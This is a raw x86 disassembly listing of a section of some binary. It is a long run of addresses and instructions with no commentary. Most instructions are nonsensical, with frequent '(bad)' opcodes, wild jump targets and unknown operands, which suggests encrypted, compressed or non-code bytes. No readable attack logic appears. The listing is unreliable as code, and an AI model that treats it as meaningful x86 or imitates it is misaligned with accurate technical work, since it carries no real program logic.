  415a23:	sar    BYTE PTR [ebx+eax*1-0x1],0x7c
  415a28:	pop    edx
  415a29:	or     eax,0x3efe
	...
  415a56:	pop    ds
  415a57:	(bad)
  415a5b:	inc    ebx
  415a5c:	std    
  415a5d:	cs mov ch,0xde
  415a60:	in     al,0x1e
  415a62:	fild   WORD PTR [ebx+ebp*2]
  415a65:	jmp    0xa8a967cf
  415a6a:	cmp    eax,0x731b404
  415a6f:	add    eax,0x5b7106fe
  415a74:	call   0xfe45d84a
  415a79:	pusha  
  415a7a:	shl    DWORD PTR [ebx],0xf6
  415a7d:	out    dx,al
  415a7e:	(bad)  
  415a80:	cmp    DWORD PTR [ecx+0x39fe0196],0x22
  415a87:	push   ecx
  415a88:	push   0x28
  415a8a:	inc    edx
  415a8b:	add    dh,BYTE PTR [ecx+esi*4-0x3901fe7a]
  415a92:	lock pop edx
  415a94:	call   0xfe43588a
  415a99:	pusha  
  415a9a:	shr    BYTE PTR [esi],0xf6
  415a9d:	scas   al,BYTE PTR es:[edi]
  415a9e:	sahf   
  415a9f:	fnstsw WORD PTR [ebx-0x1fe6967]
  415aa5:	jmp    0x54c2d0b3
  415aaa:	pop    ecx
  415aab:	or     esi,edi
  415aad:	mov    ?,WORD PTR ds:0x64006287
  415ab3:	loope  0x415a9a
  415ab5:	not    DWORD PTR [eax+0x7b]
  415ab8:	std    
  415ab9:	jae    0x415abb
	...
  415ae3:	add    BYTE PTR [esi],ch
  415ae5:	out    dx,eax
  415ae6:	std    
  415ae7:	inc    DWORD PTR [eax-0x44]
  415aea:	(bad)  
  415aeb:	jne    0x415aa4
  415aed:	jbe    0x415b61
  415aef:	cmp    DWORD PTR [eax],edx
  415af1:	jnp    0x415af1
  415af3:	mov    ch,0x7
  415af5:	mov    ds:0x28f0fffe,eax
  415afa:	push   cs
  415afb:	call   0x3ec068
  415b00:	push   eax
  415b01:	jmp    0x7b9252ef
  415b06:	(bad)  
  415b07:	jne    0x415b70
  415b09:	jbe    0x415ac3
  415b0b:	cmp    DWORD PTR [eax],esp
  415b0d:	jnp    0x415b0d
  415b0f:	mov    ch,0x4f
  415b11:	mov    ds:0x2950fffe,eax
  415b16:	push   cs
  415b17:	call   0x3ec018
  415b1c:	inc    eax
  415b1d:	jmp    0xa29252fb
  415b22:	(bad)  
  415b23:	mov    ch,0x3b
  415b25:	mov    ds:0x2850fffe,eax
  415b2a:	push   cs
  415b2b:	call   0x3ebbbc
  415b30:	adc    ah,ah
  415b32:	(bad)  
  415b34:	adc    BYTE PTR [edx+0x762775fe],ah
  415b3a:	mov    BYTE PTR [ecx],bh
  415b3c:	add    BYTE PTR [edx-0x5648427e],ah
  415b42:	(bad)  
  415b43:	call   DWORD PTR [edi]
  415b45:	sub    ah,BYTE PTR [ecx]
  415b47:	push   0x0
	...
  415b70:	add    BYTE PTR [eax],al
  415b72:	push   ss
  415b73:	pop    esi
  415b74:	in     eax,dx
  415b75:	mov    esi,0xe80e23a0
  415b7a:	neg    BYTE PTR [esi-0x3]
  415b7d:	(bad)  
  415b7e:	ds jmp 0xd12b2b1b
  415b84:	pop    ebp
  415b85:	(bad)  
  415b86:	xchg   ebx,eax
  415b87:	fist   WORD PTR [ebp-0x2]
  415b8a:	rol    DWORD PTR [eax-0x3b29f029],1
  415b90:	sbb    al,0xff
  415b92:	shl    DWORD PTR [eax-0x29],0xf
  415b96:	mov    ecx,0xb1f63cde
  415b9b:	mov    al,ds:0x9c36745d
  415ba0:	sub    al,0xfe
  415ba2:	mov    eax,ds:0x76b45d90
  415ba7:	inc    eax
  415ba8:	pop    ebp
  415ba9:	(bad)  
  415baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bab:	add    ebx,DWORD PTR [esi]
  415bad:	dec    DWORD PTR [ecx-0x761068b8]
  415bb3:	xor    BYTE PTR [ebp-0x19],bl
  415bb6:	and    edi,eax
  415bb8:	pop    esi
  415bb9:	(bad)  
  415bba:	jno    0x415b62
  415bbc:	jo     0x415bb4
  415bbe:	imul   ebp,DWORD PTR [eax+0x6c],0x5d512219
  415bc5:	(bad)  
  415bc6:	xchg   ebx,eax
  415bc7:	imul   edx,DWORD PTR [ebp-0x2],0x51
  415bcb:	imul   ecx,DWORD PTR ds:0x5f08493c,0xffffffb4
  415bd2:	pop    edx
  415bd3:	or     BYTE PTR [edi-0x2],bl
	...
  415bfe:	add    BYTE PTR [eax],al
  415c00:	es out dx,eax
  415c02:	sbb    eax,0x992231ff
  415c07:	fbstp  TBYTE PTR [ecx]
  415c09:	sub    bl,BYTE PTR [edi-0x19]
  415c0c:	daa    
  415c0d:	outs   dx,BYTE PTR ds:[esi]
  415c0e:	pop    ebp
  415c0f:	(bad)  
  415c10:	sbb    DWORD PTR [eax-0x3dee09cb],eax
  415c16:	imul   ebp,ebp,0xfe5ec945
  415c1c:	jnp    0x415be8
  415c1e:	ins    BYTE PTR es:[edi],dx
  415c1f:	stc    
  415c20:	sti    
  415c21:	pop    ebx
  415c22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c23:	pop    esi
  415c24:	lock xchg BYTE PTR [ebx-0x18ccc895],bl
  415c2b:	add    esi,edi
  415c2d:	sbb    eax,0xd47303dc
  415c32:	xchg   ebx,eax
  415c33:	cmp    ch,0xff
  415c36:	adc    DWORD PTR [esp+edx*2],eax
  415c39:	mov    ?,WORD PTR [esi-0x28]
  415c3c:	cmp    ebx,esi
  415c3e:	out    0x1c,eax
  415c40:	mov    ecx,0xb5c87100
  415c45:	add    ch,dl
  415c47:	or     edx,DWORD PTR [esi]
  415c49:	fcmovnb st,st(0)
  415c4b:	les    esp,FWORD PTR [ecx+0x1ae1501]
  415c51:	call   0x5e3e:0xfeb06be7
  415c58:	mov    BYTE PTR [esi+0x7201ebdf],al
  415c5e:	test   al,0x3
  415c60:	out    0x5c,al
  415c62:	out    0x3,eax
	...
  415c8c:	add    BYTE PTR [eax],al
  415c8e:	mov    esi,0x68606cf3
  415c93:	add    BYTE PTR [edi],dl
  415c95:	fsub   DWORD PTR [ebp+0x0]
  415c98:	xchg   ebp,eax
  415c99:	or     esp,DWORD PTR [esi+0x6c]
  415c9c:	rcr    BYTE PTR [esi+0x50],0x12
  415ca0:	sub    al,BYTE PTR [edi]
  415ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ca4:	bound  ebp,QWORD PTR [edi-0x44]
  415ca7:	pop    ss
  415ca8:	in     al,dx
  415ca9:	mov    ah,0x90
  415cab:	jne    0x415c94
  415cad:	jmp    0xc965d35
  415cb2:	push   ss
  415cb3:	(bad)  
  415cb4:	minps  xmm4,XMMWORD PTR [eax]
  415cb7:	shl    BYTE PTR [eax+eiz*2],cl
  415cba:	les    eax,FWORD PTR [ebp-0x7]
  415cbd:	retf   
  415cbe:	jle    0x415d1b
  415cc0:	jb     0x415ce1
  415cc2:	push   eax
  415cc3:	xchg   ebx,eax
  415cc4:	add    BYTE PTR [eax],ch
  415cc6:	cmp    bl,bl
  415cc8:	cmp    eax,0x689711e9
  415ccd:	add    ah,ah
  415ccf:	call   0xe926:0x2a5a3600
  415cd6:	cmp    eax,0xdb15c054
  415cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cdc:	call   0xfe4255b0
  415ce1:	sbb    edx,ebx
  415ce3:	(bad)  
  415ce4:	std    
  415ce5:	xchg   BYTE PTR [eax+0x7d032477],ah
  415ceb:	dec    DWORD PTR [ebp+0x66]
  415cee:	mov    DWORD PTR [edi-0x18],edx
  415cf1:	sbb    eax,DWORD PTR [eax]
	...
  415d1b:	add    BYTE PTR [esi+0x4741fe00],dl
  415d21:	inc    esp
  415d22:	std    
  415d23:	dec    esi
  415d24:	daa    
  415d25:	pop    ebx
  415d26:	inc    esi
  415d27:	imul   esi,DWORD PTR [eax],0x8043735b
  415d2d:	add    esi,DWORD PTR [edx]
  415d2f:	sub    DWORD PTR [ebp+0x1b2efe00],esp
  415d35:	or     ch,BYTE PTR [edi-0x4679c51f]
  415d3b:	push   ds
  415d3c:	xchg   ecx,eax
  415d3d:	add    edi,esi
  415d3f:	pushf  
  415d40:	xor    eax,0xfad195f3
  415d45:	add    BYTE PTR [esi-0x59],bl
  415d48:	add    al,0x1a
  415d4a:	add    eax,0xecd490e9
  415d4f:	push   0xfffffff6
  415d51:	add    ebp,DWORD PTR [ebx-0x17]
  415d54:	daa    
  415d55:	mov    ?,ebp
  415d57:	pop    esp
  415d58:	inc    edx
  415d59:	repz aaa 
  415d5b:	and    DWORD PTR [ebx-0x61d37803],ecx
  415d61:	je     0x415d63
  415d63:	inc    ecx
  415d64:	int    0x74
  415d66:	aas    
  415d67:	add    BYTE PTR [edi],ah
  415d69:	repz xor BYTE PTR [edx+0x56],ch
  415d6d:	push   edi
  415d6e:	std    
  415d6f:	xor    eax,0x4112b9
  415d74:	call   FWORD PTR [edi+0x5398ff3c]
  415d7a:	shl    BYTE PTR [esi+edi*1-0x39],0x65
	...
  415da7:	add    BYTE PTR [eax],al
  415da9:	add    bh,dl
  415dab:	outs   dx,DWORD PTR ds:[esi]
  415dac:	mov    ebx,0x40f14568
  415db1:	add    BYTE PTR [edi],dh
  415db3:	mov    al,ds:0x99af0874
  415db8:	(bad)  
  415db9:	dec    DWORD PTR [eax+0x72]
  415dbc:	(bad)  
  415dbd:	cmp    ch,BYTE PTR [eax]
  415dbf:	lahf   
  415dc0:	add    BYTE PTR gs:[edi+0x7568bb6f],ah
  415dc7:	hlt    
  415dc8:	inc    eax
  415dc9:	add    BYTE PTR [edi-0x3f],bh
  415dcc:	addr16 inc ecx
  415dce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dcf:	lahf   
  415dd0:	je     0x415dda
  415dd2:	out    dx,eax
  415dd3:	test   eax,0x9f48ff62
  415dd8:	je     0x415dd6
  415dda:	dec    eax
  415ddb:	and    eax,0x5f41e806
  415de0:	std    
  415de1:	jmp    FWORD PTR [esi]
  415de3:	pushf  
  415de4:	add    DWORD PTR [eax],eax
  415de6:	mov    dl,0xd3
  415de8:	jmp    0x53df7170
  415ded:	push   edi
  415dee:	mov    ebp,0x38506a5a
  415df3:	and    eax,0x670fe806
  415df8:	std    
  415df9:	(bad)  
  415dfa:	ficom  WORD PTR [edx+edi*8]
  415dfd:	mov    esi,edx
  415dff:	imul   ecx,DWORD PTR [eax+0x41],0x27
  415e03:	int    0x3c
  415e05:	outs   dx,DWORD PTR ss:[esi]
  415e07:	sbb    dh,bh
  415e09:	jg     0x415e49
  415e0b:	gs add al,0x74
	...
  415e36:	add    BYTE PTR [eax],al
  415e38:	sbb    DWORD PTR [ebx+edx*8-0x4d0b8097],0xffffffe7
  415e40:	and    edx,DWORD PTR [esi+0x4]
  415e43:	add    BYTE PTR ds:0x901ed0b4,dh
  415e49:	sbb    al,0x1c
  415e4b:	inc    esp
  415e4c:	icebp  
  415e4d:	mov    ah,0xb4
  415e4f:	addr16 ds hlt 
  415e52:	push   0xffffffbd
  415e54:	push   esi
  415e55:	imul   ebp,esi,0x59443e40
  415e5b:	je     0x415ea3
  415e5d:	in     al,dx
  415e5e:	mov    edi,0x6c7cc962
  415e63:	dec    ebp
  415e64:	add    al,0x85
  415e66:	pop    ecx
  415e67:	jmp    0x1f3e:0x3d84363f
  415e6e:	pop    esp
  415e6f:	inc    ebp
  415e70:	stos   BYTE PTR es:[edi],al
  415e71:	pusha  
  415e72:	inc    esp
  415e73:	mov    eax,0xfe59a4a1
  415e78:	mov    WORD PTR [ebp+0x1c],?
  415e7b:	pop    es
  415e7c:	or     ebx,ecx
  415e7e:	pop    ecx
  415e7f:	je     0x415e0b
  415e81:	cmp    al,0xcf
  415e83:	pop    es
  415e84:	xchg   esi,eax
  415e85:	fst    DWORD PTR [ecx]
  415e87:	(bad)  
  415e88:	jns    0x415e56
  415e8a:	mov    bh,0xc8
  415e8c:	jl     0x415e7d
  415e8e:	add    DWORD PTR [ebp-0x4b],edx
  415e91:	dec    edi
  415e92:	test   ebx,eax
  415e94:	bound  edi,QWORD PTR [ebp-0x25c1964e]
  415e9a:	mov    ah,0xfe
	...
  415ec4:	add    BYTE PTR [eax],al
  415ec6:	retf   
  415ec7:	or     ebp,DWORD PTR [edx+0x49]
  415eca:	adc    ebp,edi
  415ecc:	pop    edx
  415ecd:	mov    bl,bh
  415ecf:	pop    es
  415ed0:	(bad)  
  415ed1:	xor    al,0x6c
  415ed3:	mov    edx,0x5bc4ffc4
  415ed8:	and    al,0x12
  415eda:	jbe    0x415e76
  415edc:	out    0x83,eax
  415ede:	pusha  
  415edf:	pop    ebx
  415ee0:	pop    ebx
  415ee1:	shl    DWORD PTR [ecx+0x11c541d4],0xa6
  415ee8:	iret   
  415ee9:	loop   0x415f4e
  415eeb:	pop    ebx
  415eec:	out    0xe,eax
  415eee:	inc    BYTE PTR [edi-0x3f1e4e2a]
  415ef4:	sub    bl,BYTE PTR [ebx-0x10]
  415ef7:	stos   DWORD PTR es:[edi],eax
  415ef8:	(bad)  
  415efa:	ds in  al,dx
  415efc:	pop    ebp
  415efd:	jmp    0x415ec5
  415eff:	jno    0x415f29
  415f01:	add    al,0x6e
  415f03:	cld    
  415f04:	adc    al,0xc
  415f06:	out    0x14,al
  415f08:	or     bl,BYTE PTR [ebx-0x38]
  415f0b:	repz xchg edi,eax
  415f0d:	sbb    al,0xc1
  415f0f:	cld    
  415f10:	add    BYTE PTR [eax+eax*1],0xdb
  415f14:	lods   eax,DWORD PTR ds:[esi]
  415f15:	add    ebp,DWORD PTR [ebx]
  415f17:	add    DWORD PTR [esi-0x5ee493a9],ebp
  415f1d:	pop    edx
  415f1e:	mov    al,ds:0xeb5556fc
  415f23:	inc    ebx
  415f24:	out    0xd0,al
  415f26:	aam    0xfc
  415f28:	mov    esp,0x57
	...
  415f51:	add    BYTE PTR [eax],al
  415f53:	add    BYTE PTR [eax+0x556bef86],cl
  415f59:	inc    esp
  415f5a:	ss pop edx
  415f5c:	sbb    BYTE PTR [ebp+0x5b3d4520],bl
  415f62:	mov    esp,0x23d8558e
  415f67:	push   edi
  415f68:	xlat   BYTE PTR ds:[ebx]
  415f69:	pop    edx
  415f6a:	xor    DWORD PTR [ebp+0x6bdf8658],0x5a064583
  415f74:	mov    dh,0x96
  415f76:	sti    
  415f77:	jmp    0xfc3d:0xa800719d
  415f7e:	jae    0x415f61
  415f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f81:	mov    fs,eax
  415f83:	out    0x87,al
  415f85:	std    
  415f86:	jae    0x415f65
  415f88:	xchg   DWORD PTR [edi+0x4675c108],eax
  415f8e:	std    
  415f8f:	into   
  415f90:	test   DWORD PTR [edx],ebx
  415f92:	add    eax,0xecd0d8e9
  415f97:	push   0x7e
  415f99:	sbb    al,0x57
  415f9b:	mov    dh,0x9
  415f9d:	push   eax
  415f9e:	call   0xfe3db3c7
  415fa3:	bnd jge 0x415f2d
  415fa6:	add    edi,DWORD PTR [edi]
  415fa8:	jne    0x415fc4
  415faa:	or     ecx,ebp
  415fac:	rcl    BYTE PTR [esi-0x7888c610],0xc
  415fb3:	xchg   ecx,eax
  415fb4:	outs   dx,DWORD PTR ds:[esi]
  415fb5:	ds std 
  415fb7:	jle    0x415fb9
	...
  415fe1:	add    BYTE PTR [ebx],dh
  415fe3:	sbb    ecx,DWORD PTR [esi]
  415fe5:	ins    DWORD PTR es:[edi],dx
  415fe6:	dec    edx
  415fe7:	pop    edx
  415fe8:	add    cl,ch
  415fea:	push   ss
  415feb:	xchg   esp,edi
  415fed:	push   ecx
  415fee:	call   0xb5a05d35
  415ff3:	xchg   esi,eax
  415ff4:	in     al,dx
  415ff5:	push   esi
  415ff6:	mov    edi,edi
  415ff8:	std    
  415ff9:	aam    0x19
  415ffb:	std    
  415ffc:	jae    0x41603f
  415ffe:	sbb    bh,BYTE PTR [edi+esi*1+0x3e]
  416002:	out    0xd0,eax
  416004:	jae    0x41604b
  416006:	in     eax,0xab
  416008:	add    cl,ch
  41600a:	cmp    eax,0x7c923173
  41600f:	sti    
  416010:	push   ebx
  416011:	adc    ecx,eax
  416013:	ss add cl,ch
  416016:	dec    edx
  416017:	sbb    esi,DWORD PTR [esp+eiz*8-0x1c]
  41601b:	mov    dh,0x0
  41601d:	add    BYTE PTR [edi+0x57],dl
  416020:	mov    eax,esi
  416022:	scas   eax,DWORD PTR es:[edi]
  416023:	imul   ax,WORD PTR [ecx+0x27],0xdd87
  416029:	and    esp,DWORD PTR [edi]
  41602b:	pop    edi
  41602c:	add    eax,esi
  41602e:	scas   al,BYTE PTR es:[edi]
  41602f:	sub    esi,esp
  416031:	push   0x41085c
  416036:	pop    ecx
  416037:	xchg   DWORD PTR [ebp+0x25],edi
  41603a:	daa    
  41603b:	pop    edi
  41603c:	or     eax,eax
  41603e:	dec    edx
  41603f:	cli    
  416040:	call   0xa077c5
  416045:	mov    al,BYTE PTR [eax]
	...
  41606f:	add    BYTE PTR [edi],dl
  416071:	popf   
  416072:	std    
  416073:	call   DWORD PTR [edi-0x4f]
  416076:	(bad)  
  416077:	jne    0x416048
  416079:	xchg   BYTE PTR [ebp+0x95ed723],dh
  41607f:	sar    BYTE PTR [ebx],0xff
  416082:	mov    BYTE PTR [ebp-0x45],al
  416085:	xchg   ebx,eax
  416086:	je     0x416070
  416088:	scas   eax,DWORD PTR es:[edi]
  416089:	imul   eax,DWORD PTR [ebp-0x1],0x40
  41608d:	in     eax,0x44
  41608f:	loopne 0x4160c1
  416091:	sub    edx,esp
  416093:	jmp    FWORD PTR [edx-0x11861a82]
  416099:	xchg   ebx,eax
  41609a:	dec    BYTE PTR [ebx]
  41609c:	push   edi
  41609d:	sub    bh,BYTE PTR [ebx]
  41609f:	rol    DWORD PTR [edx-0xdff9866],1
  4160a5:	mov    eax,0x290050e1
  4160aa:	fsubp  st(0),st
  4160ac:	xor    al,BYTE PTR [ecx]
  4160ae:	(bad)  
  4160af:	call   FWORD PTR [esi+ebx*4+0x71]
  4160b3:	es jg  0x416113
  4160b6:	add    bh,ch
  4160b8:	loope  0x41604c
  4160ba:	je     0x4160c4
  4160bc:	dec    edi
  4160bd:	scas   al,BYTE PTR es:[edi]
  4160be:	xor    al,0xff
  4160c0:	ds push ecx
  4160c2:	pop    eax
  4160c3:	je     0x41612b
  4160c5:	imul   ecx,esi,0xea95607
  4160cb:	inc    DWORD PTR [ecx-0x7]
  4160ce:	retf   
  4160cf:	jecxz  0x41610a
  4160d1:	ja     0x416134
  4160d3:	inc    BYTE PTR [eax]
	...
  4160fd:	add    BYTE PTR [ebx+0x736c69fc],ch
  416103:	add    DWORD PTR [esi-0x2],edx
  416106:	stos   DWORD PTR es:[edi],eax
  416107:	and    al,0x6d
  416109:	jge    0x416161
  41610b:	adc    DWORD PTR [esi+0x59],edx
  41610e:	jbe    0x41618c
  416110:	hlt    
  416111:	jg     0x41615b
  416113:	add    al,0x7
  416115:	test   DWORD PTR [ecx-0x47],edi
  416118:	push   ebp
  416119:	(bad)  
  41611a:	pushw  es
  41611c:	add    ch,bh
  41611e:	mov    al,0xc8
  416120:	iret   
  416121:	pop    es
  416122:	(bad)  
  416123:	not    BYTE PTR [eax]
  416125:	jmp    ecx
  416127:	fmul   st,st(7)
  416129:	sti    
  41612a:	fst    DWORD PTR [esi+0x68]
  41612d:	dec    BYTE PTR [ebx-0x4]
  416130:	imul   edi,DWORD PTR [ebx+edx*1],0x4bfe55e1
  416137:	call   0x71b7aea8
  41613c:	push   ebp
  41613d:	mov    ebx,?
  41613f:	jae    0x4160f5
  416141:	out    0x2b,eax
  416143:	inc    edx
  416144:	push   ebp
  416145:	(bad)  
  416146:	xchg   ebp,eax
  416147:	add    esi,DWORD PTR [eax+ecx*8+0x5501fb7c]
  41614e:	lds    esi,FWORD PTR [edi]
  416150:	add    ebx,0xfbbf6ea2
  416156:	out    dx,al
  416157:	cmp    bh,cl
  416159:	or     edi,DWORD PTR [ecx-0x4a]
  41615c:	or     eax,ebp
  41615e:	adc    eax,0x460
	...
  41618b:	add    BYTE PTR ds:0xbb07275b,dh
  416191:	inc    edx
  416192:	call   0xe7c69f9a
  416197:	jmp    0x4161d9
  416199:	xchg   BYTE PTR [eax-0xc90b6fd],ch
  41619f:	push   esi
  4161a0:	retf   0xf62
  4161a3:	pop    ds
  4161a4:	jne    0x41619e
  4161a6:	test   BYTE PTR [edx+edi*2-0x69fc7e0d],0x4f
  4161ae:	push   edx
  4161af:	lds    esp,FWORD PTR [ecx]
  4161b1:	cli    
  4161b2:	push   esp
  4161b3:	or     BYTE PTR [ecx],bl
  4161b5:	outs   dx,DWORD PTR ds:[esi]
  4161b6:	fild   QWORD PTR [ebx+0x2f]
  4161b9:	xor    al,0xce
  4161bb:	push   esi
  4161bc:	mov    dh,0x9e
  4161be:	mov    ebx,0x17ff7a88
  4161c3:	in     al,dx
  4161c4:	push   esp
  4161c5:	test   BYTE PTR [eax],ch
  4161c7:	add    al,0xf1
  4161c9:	outs   dx,BYTE PTR ds:[esi]
  4161ca:	fist   DWORD PTR [esi+0x72]
  4161cd:	arpl   WORD PTR [edi-0x6107d8a6],cx
  4161d3:	mov    WORD PTR [edx+0x660401eb],es
  4161d9:	cmp    eax,0xf9c9c502
  4161de:	cld    
  4161df:	pop    es
  4161e0:	shr    DWORD PTR [esi-0x11],0x6b
  4161e4:	mov    ds:0xc6567635,eax
  4161e9:	sahf   
  4161ea:	jnp    0x4161d5
  4161ec:	test   eax,0xeb0e80
	...
  416219:	add    dh,bh
  41621b:	pop    edx
  41621c:	pop    esi
  41621d:	rol    BYTE PTR [ebp-0x8],1
  416220:	fmul   QWORD PTR [ebx]
  416222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416223:	or     dl,BYTE PTR [edx]
  416225:	push   edi
  416226:	mov    dl,ah
  416228:	lods   al,BYTE PTR ds:[esi]
  416229:	imul   edi,DWORD PTR [esi+esi*2-0x20b6fcc9],0x0
  416231:	push   0x3d
  416233:	pop    ebx
  416234:	add    BYTE PTR [edx-0x7a],ch
  416237:	cld    
  416238:	add    BYTE PTR [ebp+0x573f986],bl
  41623e:	lock outs dx,BYTE PTR ds:[esi]
  416240:	lock add DWORD PTR [eax-0x60],edi
  416244:	std    
  416245:	push   cs
  416246:	xor    al,0x1b
  416248:	jne    0x4161e1
  41624a:	or     al,BYTE PTR [edi-0x19c26c1c]
  416250:	inc    ebx
  416251:	or     eax,0xf973f8ed
  416256:	xchg   esp,eax
  416257:	pop    ebp
  416258:	pop    edi
  416259:	out    0x8b,al
  41625b:	rcl    BYTE PTR gs:[ebp-0x2b],0xdc
  416260:	jnp    0x416233
  416262:	cmp    ch,BYTE PTR [edi+0x51]
  416265:	push   0xfffffff1
  416267:	jmp    0x416269
  416269:	cmp    eax,0xb97bdcf9
  41626e:	inc    edx
  41626f:	outs   dx,DWORD PTR ds:[esi]
  416270:	inc    ebp
  416271:	inc    ecx
  416272:	cmp    bl,BYTE PTR [ebx-0x13]
  416275:	outs   dx,DWORD PTR ds:[esi]
  416276:	xchg   ebx,eax
  416277:	outs   dx,DWORD PTR ds:[esi]
  416278:	adc    BYTE PTR [ecx-0x6102d412],dl
	...
  4162a6:	add    BYTE PTR [eax],al
  4162a8:	jae    0x416319
  4162aa:	clc    
  4162ab:	xchg   esi,eax
  4162ac:	add    DWORD PTR [eax-0x18],ebp
  4162af:	add    ch,BYTE PTR [esi]
  4162b1:	clc    
  4162b2:	std    
  4162b3:	xchg   cl,dh
  4162b5:	jmp    0x4162b4
  4162b7:	hlt    
  4162b8:	lods   eax,DWORD PTR ds:[esi]
  4162b9:	jmp    DWORD PTR [eax-0x43]
  4162bc:	or     bh,cl
  4162be:	std    
  4162bf:	hlt    
  4162c0:	or     ecx,edi
  4162c2:	jae    0x41631d
  4162c4:	or     ebp,DWORD PTR [edi+0x10]
  4162c7:	push   ecx
  4162c8:	cmp    BYTE PTR [edi],ch
  4162ca:	std    
  4162cb:	push   esi
  4162cc:	jmp    0x41633c
  4162ce:	in     al,dx
  4162cf:	dec    esi
  4162d0:	jns    0x416339
  4162d2:	call   0xfda932d7
  4162d7:	(bad)  
  4162d8:	cmp    BYTE PTR [eax],ch
  4162da:	out    0xff,al
  4162dc:	mov    dl,0xeb
  4162de:	in     eax,0x3c
  4162e0:	jae    0x416270
  4162e2:	(bad)  
  4162e3:	inc    edx
  4162e5:	xchg   ebx,eax
  4162e6:	in     eax,0x21
  4162e8:	jo     0x416278
  4162ea:	(bad)  
  4162eb:	push   DWORD PTR [edx+0x7019e5a7]
  4162f1:	mov    ?,esi
  4162f3:	inc    edx
  4162f5:	mov    esp,ebp
  4162f7:	adc    eax,esi
  4162f9:	(bad)  
  4162fa:	(bad)  
  4162fb:	push   DWORD PTR [edx-0xff61a82]
  416301:	(bad)  
  416302:	(bad)  
  416303:	inc    DWORD PTR [edx+0x3001e587]
  416309:	nop
  41630a:	(bad)  
  41630b:	inc    DWORD PTR [eax]
	...
  416335:	add    BYTE PTR [edx-0x6d],dh
  416338:	in     eax,0x25
  41633a:	xor    al,0x5f
  41633c:	add    cl,cl
  41633e:	aad    0x5e
  416340:	add    BYTE PTR [ebp+0x6c],dl
  416343:	jle    0x4162c5
  416345:	(bad)  
  416346:	jmp    DWORD PTR [edi-0x4a750002]
  41634c:	stc    
  41634d:	push   eax
  41634e:	cwde   
  41634f:	and    eax,0x6732ff0a
  416354:	call   0x9c6768
  416359:	or     edx,DWORD PTR [edi-0x285a7ca1]
  41635f:	pop    edx
  416360:	add    bh,al
  416362:	bound  edx,QWORD PTR [edi+0x5aa7fffd]
  416368:	lds    eax,FWORD PTR [ebp+0x33]
  41636b:	pop    DWORD PTR [esi]
  41636d:	add    BYTE PTR [edi-0x589601fc],dl
  416373:	fld    QWORD PTR [esp+ebp*8-0x1ab6ac2]
  41637a:	out    dx,al
  41637b:	sbb    DWORD PTR [edx],eax
  41637d:	(bad)  
  41637e:	sti    
  41637f:	aaa    
  416380:	mov    cl,0x8c
  416382:	ret    
  416383:	xor    BYTE PTR [esi+edi*8+0x71],cl
  416387:	aam    0x54
  416389:	je     0x4163f1
  41638b:	inc    ebp
  41638c:	into   
  41638d:	sti    
  41638e:	push   esi
  41638f:	cmp    bl,BYTE PTR [edi]
  416391:	add    BYTE PTR [esi],bh
  416393:	jmp    0x597dd6d9
  416398:	fild   DWORD PTR [edx+0x0]
	...
  4163c2:	add    BYTE PTR [eax],al
  4163c4:	mov    edi,eax
  4163c6:	dec    ecx
  4163c7:	inc    BYTE PTR [ecx+0x3]
  4163ca:	into   
  4163cb:	add    al,0x39
  4163cd:	mov    edi,0x7efcea59
  4163d2:	jle    0x4163bb
  4163d4:	xor    DWORD PTR ds:0x86b34f52,eax
  4163da:	pop    eax
  4163db:	neg    BYTE PTR [ecx]
  4163dd:	adc    eax,0x8bfeb5
  4163e2:	push   ebx
  4163e3:	je     0x41641b
  4163e5:	sbb    al,0x82
  4163e7:	cmp    BYTE PTR [ecx],al
  4163e9:	sbb    eax,0xf172bffe
  4163ee:	jl     0x416374
  4163f0:	out    dx,al
  4163f1:	mov    ah,0x51
  4163f3:	(bad)  
  4163f4:	push   esi
  4163f5:	neg    dh
  4163f7:	inc    eax
  4163f8:	ds mov ebp,0xd4d1ef97
  4163fe:	push   ecx
  4163ff:	out    0xef,eax
  416401:	and    DWORD PTR [edx],eax
  416403:	add    BYTE PTR ds:0xc10dd8c4,dh
  416409:	ss push esp
  41640b:	idiv   BYTE PTR [ecx+0x4e745174]
  416411:	fdivr  QWORD PTR [eax]
  416413:	sti    
  416414:	test   eax,0xaeb45184
  416419:	pop    edx
  41641a:	pop    esi
  41641b:	push   ebx
  41641c:	cwde   
  41641d:	add    ch,BYTE PTR [eax+0x56f59119]
  416423:	leave  
  416424:	xchg   ecx,eax
  416425:	add    eax,edx
  416427:	push   edx
	...
  416450:	add    BYTE PTR [eax],al
  416452:	xor    ch,0x46
  416455:	fnstenv [ebp+0x2]
  416458:	pushf  
  416459:	and    eax,0x46205b3e
  41645e:	xor    eax,0x557e945b
  416463:	fldcw  WORD PTR [ebx]
  416465:	push   eax
  416466:	out    0x5a,eax
  416468:	xchg   ecx,eax
  416469:	mov    dh,0x50
  41646b:	outs   dx,DWORD PTR ds:[esi]
  41646c:	fistp  WORD PTR [ebx-0x11]
  41646f:	sub    DWORD PTR [esi],ecx
  416471:	push   ebx
  416472:	mov    dh,0x9f
  416474:	add    edx,DWORD PTR [ebx-0x4e]
  416477:	arpl   WORD PTR [edi-0x18655871],cx
  41647d:	push   edx
  41647e:	jb     0x416445
  416480:	lahf   
  416481:	les    esp,FWORD PTR [ecx]
  416483:	std    
  416484:	lods   eax,DWORD PTR ds:[esi]
  416485:	push   eax
  416486:	sbb    ch,dh
  416488:	(bad)  
  41648a:	cmp    DWORD PTR [ebx+0x5b7edd93],eax
  416490:	aas    
  416491:	push   es
  416492:	ds pop ebx
  416494:	addr16 pop ebx
  416496:	lods   eax,DWORD PTR ds:[esi]
  416497:	idiv   BYTE PTR [esi-0x20910fae]
  41649d:	fcmovnu st,st(4)
  41649f:	sub    DWORD PTR [eax],0x552ee104
  4164a5:	mov    ebx,0x5d8f5b7e
  4164aa:	shl    esp,cl
  4164ac:	xchg   esi,eax
  4164ad:	push   edx
  4164ae:	push   edx
  4164af:	arpl   di,di
  4164b1:	push   di
  4164b3:	call   0x0:0xdbe7
	...
  4164de:	add    BYTE PTR [eax],al
  4164e0:	aas    
  4164e1:	pop    ebx
  4164e2:	out    0x83,eax
  4164e4:	cdq    
  4164e5:	adc    eax,DWORD PTR [ecx]
  4164e7:	ja     0x4164f5
  4164e9:	cmc    
  4164ea:	std    
  4164eb:	hlt    
